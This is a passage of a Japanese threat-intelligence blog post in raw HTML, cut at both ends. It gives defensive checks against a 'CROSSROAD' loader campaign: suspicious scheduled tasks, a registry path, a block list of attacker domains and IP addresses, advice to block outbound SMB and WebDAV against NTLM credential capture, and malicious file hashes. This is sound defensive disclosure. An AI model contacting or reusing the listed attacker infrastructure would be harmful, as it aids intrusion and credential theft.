baseline;\">html\\</code><span style=\"vertical-align: baseline;\"> ディレクトリに不正な実行可能ファイルがドロップされていないか確認します。</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">表 1: エンドポイント ファイルのチェック</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">スケジュールされたタスクとレジストリ</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">スケジュールされたタスク:</strong><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">\\NitroRuntime</code><span style=\"vertical-align: baseline;\"> または </span><code style=\"vertical-align: baseline;\">\\RadminComponentRuntime</code><span style=\"vertical-align: baseline;\"> という名前の不正なタスクがないか確認します。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">レジストリ:</strong><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">\\REGISTRY\\MACHINE\\SYSTEM\\Software\\Microsoft\\TIP\\AggregateResults\\data</code><span style=\"vertical-align: baseline;\"> に異常なバイナリ blob がないか確認します。</span></p>\n</li>\n</ul>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">ネットワーク防御</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">promotion.storage-data.com</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">aomei.storage-data.com</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">storage-data.com</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">8.210.84.56</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">47.239.60.117</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">8.218.65.184</code><span style=\"vertical-align: baseline;\"> へのアウトバウンド ネットワーク接続をブロックします。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">NTLM 認証情報の強制取得を防止するため、外部 IP アドレスへのアウトバウンド SMB（TCP 445）および WebDAV トラフィックをブロックします。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">プロキシとウェブ ゲートウェイのログを調べ、ユーザー エージェント </span><code style=\"vertical-align: baseline;\">Anyviewer-loader/1.0</code><span style=\"vertical-align: baseline;\"> の指定、または Alibaba Cloud OSS エンドポイント </span><code style=\"vertical-align: baseline;\">serv.oss-cn-hongkong.aliyuncs.com</code><span style=\"vertical-align: baseline;\"> へのリクエストがないか確認します。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">セキュリティ侵害インジケーター（IoC）</strong></p>\n<p><span style=\"vertical-align: baseline;\">このブログ投稿で概要を説明している活動を捕捉し特定するために、コミュニティ全体を支援する目的で、登録ユーザー向けにセキュリティ侵害インジケーター（IOC）を</span><a href=\"https://www.virustotal.com/gui/collection/dcba624e1f934c2dc047f12161f51397b1603610f7d7a15069c38f0c5bd9e09f\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">GTI コレクション</span></a><span style=\"vertical-align: baseline;\">に含めました。</span></p>\n<p><strong style=\"vertical-align: baseline;\">悪意のあるファイルのハッシュ（SHA-256）</strong></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ファイル / 説明</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">SHA-256</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">upgrade-now.zip</strong><span style=\"vertical-align: baseline;\">（5 月 20 日 CROSSROAD アーカイブ）</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">6670ab3f0434a42f33416f8354150b1701e7615f3cfa2f1635e54f8df0f6eec7</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">upgrade-now.exe</strong><span style=\"vertical-align: baseline;\">（5 月 20 日 CROSSROAD ローダ）</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">11e576df44e9c9eef72b9f5b699291bcdb200a19130778ec231e5b0987b913ad</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">upgrade-now.exe</strong><span style=\"vertical-align: baseline;\">（7 月 16 日 CROSSROAD ローダ）</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">9a58e8f49edf5644e5728f74cf36f560d3d486fa51db4db